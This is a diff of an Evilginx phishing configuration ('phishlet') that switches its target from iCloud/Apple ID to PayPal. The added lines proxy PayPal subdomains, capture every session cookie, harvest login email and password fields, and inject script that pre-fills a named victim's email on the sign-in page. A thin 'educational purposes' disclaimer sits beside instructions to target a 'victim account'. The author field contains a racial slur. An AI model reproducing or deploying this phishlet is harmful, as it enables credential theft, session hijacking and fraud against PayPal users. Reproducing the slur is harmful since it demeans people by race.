@@ -1,81 +1,70 @@
-author: '@hHarry potr'
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+# Email Params can be Triggered By using Below Command.
+# lures edit params ID email=test@email.com
+# Where ID is lure id number, and test@email.com is your known victim account email address for paypal. 
+
+author: '@METAAL is een kanker neger'
 min_ver: '2.3.0'
-
 proxy_hosts:
- - {phish_sub: 'www', orig_sub: 'www', domain: 'icloud.com', session: true, is_landing: true, auto_filter: false}
- - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'apple-cloudkit.com', session: false, is_landing: false, auto_filter: false}
- - {phish_sub: 'setup', orig_sub: 'setup', domain: 'icloud.com', session: true, is_landing: false, auto_filter: false}
- - {phish_sub: 'feedbackws', orig_sub: 'feedbackws', domain: 'icloud.com', session: false, is_landing: false, auto_filter: false}
- - {phish_sub: 'appleid', orig_sub: 'appleid', domain: 'cdn-apple.com', session: false, is_landing: false, auto_filter: false}
- - {phish_sub: 'idmsa', orig_sub: 'idmsa', domain: 'icloud.com', session: true, is_landing: false, auto_filter: false}
-
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
+#  - {phish_sub: 'paypalobjects', orig_sub: 'www', domain: 'paypalobjects.com', session: false, is_landing: false}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: false, is_landing: false}
+  - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: false, is_landing: false}
+  - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: false, is_landing: false}
+  - {phish_sub: 'c6', orig_sub: 'c6', domain: 'paypal.com', session: false, is_landing: false}
+  - {phish_sub: 'hnd.stats', orig_sub: 'hnd.stats', domain: 'paypal.com', session: false, is_landing: false}
+ 
 sub_filters:
- - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'feedbackws.icloud.com', replace: 'feedbackws.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'appleid.cdn-apple.com', replace: 'appleid.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'www.icloud.com', orig_sub: 'www', domain: 'icloud.com', search: 'idmsa.icloud.com', replace: 'idmsa.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- 
- - {triggers_on: 'cdn.apple-cloudkit.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'cdn.apple-cloudkit.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'cdn.apple-cloudkit.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'cdn.apple-cloudkit.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'feedbackws.icloud.com', replace: 'feedbackws.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'cdn.apple-cloudkit.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'appleid.cdn-apple.com', replace: 'appleid.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'cdn.apple-cloudkit.com', orig_sub: 'cdn', domain: 'apple-cloudkit.com', search: 'idmsa.icloud.com', replace: 'idmsa.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- 
- - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'feedbackws.icloud.com', replace: 'feedbackws.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'appleid.cdn-apple.com', replace: 'appleid.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'setup.icloud.com', orig_sub: 'setup', domain: 'icloud.com', search: 'idmsa.icloud.com', replace: 'idmsa.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- 
- - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'feedbackws.icloud.com', replace: 'feedbackws.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'appleid.cdn-apple.com', replace: 'appleid.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'feedbackws.icloud.com', orig_sub: 'feedbackws', domain: 'icloud.com', search: 'idmsa.icloud.com', replace: 'idmsa.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- 
- - {triggers_on: 'appleid.cdn-apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'appleid.cdn-apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'appleid.cdn-apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'appleid.cdn-apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'feedbackws.icloud.com', replace: 'feedbackws.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'appleid.cdn-apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'appleid.cdn-apple.com', replace: 'appleid.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'appleid.cdn-apple.com', orig_sub: 'appleid', domain: 'cdn-apple.com', search: 'idmsa.icloud.com', replace: 'idmsa.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- 
- - {triggers_on: 'idmsa.icloud.com', orig_sub: 'idmsa', domain: 'icloud.com', search: 'www.icloud.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'idmsa.icloud.com', orig_sub: 'idmsa', domain: 'icloud.com', search: 'cdn.apple-cloudkit.com', replace: 'cdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'idmsa.icloud.com', orig_sub: 'idmsa', domain: 'icloud.com', search: 'setup.icloud.com', replace: 'setup.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'idmsa.icloud.com', orig_sub: 'idmsa', domain: 'icloud.com', search: 'feedbackws.icloud.com', replace: 'feedbackws.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'idmsa.icloud.com', orig_sub: 'idmsa', domain: 'icloud.com', search: 'appleid.cdn-apple.com', replace: 'appleid.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- - {triggers_on: 'idmsa.icloud.com', orig_sub: 'idmsa', domain: 'icloud.com', search: 'idmsa.icloud.com', replace: 'idmsa.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
- 
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypalobjects.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+#  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypalobjects.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'hnd.stats', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 't', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
 auth_tokens:
- - domain: '.icloud.com'
-   keys: ['.*,regexp']
- - domain: 'www.icloud.com'
-   keys: ['.*,regexp']
- - domain: 'setup.icloud.com'
-   keys: ['.*,regexp']
- - domain: 'idmsa.icloud.com'
-   keys: ['.*,regexp']
- 
-
-credentials:
- username:
-  key: ''
-  search: '"accountName":"([^"]*)'
-  type: 'json'
- password:
-  key: ''
-  search: '"password":"([^"]*)'
-  type: 'json'
-
+  - domain: '.paypal.com'
+    keys: ['.*,regexp']
 auth_urls:
- - '/asdasdsa/somerandom/'
+  - '/myaccount/summary'
+  - '/myaccount/.*'     
+    
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
 
 login:
- domain: 'www.icloud.com'
- path: '/'
+  domain: 'www.paypal.com'
+  path: '/signin'
+
+js_inject:
+  - trigger_domains: ["www.paypal.com"]
+    trigger_paths: ["/signin"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#email");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
